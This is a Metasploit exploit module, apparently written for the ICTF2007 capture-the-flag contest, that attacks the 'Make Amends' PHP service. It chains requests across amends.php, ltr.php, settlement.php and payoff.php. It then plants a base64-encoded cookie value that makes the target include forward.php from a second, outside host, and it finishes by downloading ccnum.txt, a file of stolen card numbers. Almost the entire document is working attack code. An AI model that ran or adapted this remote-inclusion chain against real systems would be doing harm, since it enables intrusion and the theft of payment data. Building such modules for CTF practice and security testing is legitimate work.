require 'msf/core'
require 'rubygems'
require 'ruby-debug'
require 'base64'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'make amends of ictf2007',
      'Description'    => %q{
        Exploit Make Amends service of ICTF2007.
        Attacks EvilTeam2 and uses EvilTeam1 as the forwarding server.
      },
      'Author'         => [ 'egypt' ],
      'License'        => BSD_LICENSE,
      'Version'        => '$Revision: 14774 $',
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Payload'        =>
        {
          'Space'       => 8190,
          'DisableNops' => true,
          'BadChars'    => %q|'"\`|,
          'Compat'      =>
            {
              'ConnectionType' => 'find',
            },
          'Keys'        => ['php'],
        },
      'DisclosureDate' => 'Oct 13 2008',
      'Targets'        => [ ['Automatic', { }], ],
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        OptString.new(
          'URIPATH',
          [
            true,
            'The URI to request',
            '/test.php?evalme=!CODE!'
          ]
        )
      ], self.class
    )
  end

  def check
    target_ip = datastore['RHOST']
    uri = "http://#{target_ip}/~amends/cgi-bin/amends.php"

    print_status("Checking URI #{uri}")

    response = send_request_raw(
      {
        'uri' => uri
      },
      5
    )

    if response && response.code == 200
      return Exploit::CheckCode::Detected
    end

    if response
      print_error("Server responded with #{response.code}")
    else
      print_error("No response received")
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    timeout = 5

    # EvilTeam2 is the target specified through Metasploit RHOST.
    target_ip = datastore['RHOST']

    # EvilTeam1 hosts forward.php.
    forward_url = 'http://169.254.236.101/~amends/forward.php'

    # 1. Visit amends.php on EvilTeam2.
    emailaddr = Rex::Text.rand_text_alpha_upper(4) + '@a.com'

    params =
      'first=a' +
      '&last=b' +
      '&comment=c' +
      '&email=' + Rex::Text.uri_encode(emailaddr) +
      '&price=' + Rex::Text.uri_encode('$1.11') +
      '&submit=submit'

    uri = "http://#{target_ip}/~amends/cgi-bin/amends.php?#{params}"

    print_status("Sending request for: #{uri}")

    response = send_request_raw(
      {
        'global' => true,
        'uri' => uri,
        'headers' =>
          {
            'Connection' => 'close'
          }
      },
      timeout
    )

    unless response
      fail_with(Failure::Unreachable, 'No response from amends.php')
    end

    sessionid = response.headers['Set-Cookie']

    if !sessionid
      fail_with(Failure::UnexpectedReply, 'No PHP session cookie received')
    end

    print_status("Session ID: #{sessionid}")

    # 2. Visit ltr.php on EvilTeam2.
    uri = "http://#{target_ip}/~amends/cgi-bin/ltr.php?ltrfmt=pdf"

    print_status("Sending request for: #{uri}")

    response = send_request_raw(
      {
        'global' => true,
        'uri' => uri,
        'headers' =>
          {
            'Connection' => 'close',
            'Cookie' => sessionid
          }
      },
      timeout
    )

    unless response
      fail_with(Failure::Unreachable, 'No response from ltr.php')
    end

    if response.code != 200
      fail_with(
        Failure::UnexpectedReply,
        "ltr.php returned HTTP #{response.code}"
      )
    end

    # Extract the case ID.
    match = response.body.match(/CASE ID.*?<td>(.*?)<\/td>/mi)

    unless match
      fail_with(Failure::UnexpectedReply, 'Could not find the case ID')
    end

    case_id = match[1]

    print_status("Case ID: #{case_id}")
    print_status("Email address: #{emailaddr}")

    # 3. Visit settlement.php on EvilTeam2.
    uri = "http://#{target_ip}/~amends/cgi-bin/settlement.php"

    params =
      'email=' + Rex::Text.uri_encode(emailaddr) +
      '&caseid=' + Rex::Text.uri_encode(case_id) +
      '&submit=Login'

    print_status("Sending settlement request to: #{uri}")
    print_status("Data: #{params}")

    response = send_request_raw(
      {
        'global' => true,
        'uri' => uri,
        'method' => 'POST',
        'headers' =>
          {
            'Connection' => 'Keep-Alive',
            'Content-Length' => params.length.to_s,
            'Content-Type' => 'application/x-www-form-urlencoded'
          },
        'data' => params
      },
      timeout
    )

    unless response
      fail_with(Failure::Unreachable, 'No response from settlement.php')
    end

    sessionid = response.headers['Set-Cookie']

    unless sessionid
      fail_with(Failure::UnexpectedReply, 'No settlement session cookie received')
    end

    print_status("Settlement session: #{sessionid}")

    # 4. Ask EvilTeam2 to include forward.php from EvilTeam1.
    encoded_forward_url =
      Base64.encode64(forward_url).strip

    payoff_uri = "http://#{target_ip}/~amends/cgi-bin/payoff.php"

    payoff_cookie =
      sessionid + ';ltrfmt=' + encoded_forward_url

    print_status("Sending payoff request to: #{payoff_uri}")
    print_status("Using forwarding file: #{forward_url}")

    response = send_request_raw(
      {
        'global' => true,
        'uri' => payoff_uri,
        'headers' =>
          {
            'Connection' => 'close',
            'Cookie' => payoff_cookie
          }
      },
      timeout
    )

    unless response
      fail_with(Failure::Unreachable, 'No response from payoff.php')
    end

    print_status("Payoff response:")
    print_line(response.body)

    # 5. Retrieve the generated result from EvilTeam2.
    result_uri =
      "http://#{target_ip}/~amends/settlement/ccnum.txt"

    print_status("Requesting result from: #{result_uri}")

    response = send_request_raw(
      {
        'global' => true,
        'uri' => result_uri,
        'headers' =>
          {
            'Connection' => 'close'
          }
      },
      timeout
    )

    if response
      print_status("Final response:")
      print_line(response.body)
    else
      print_error('No response received for the final result')
    end

    handler
  end
end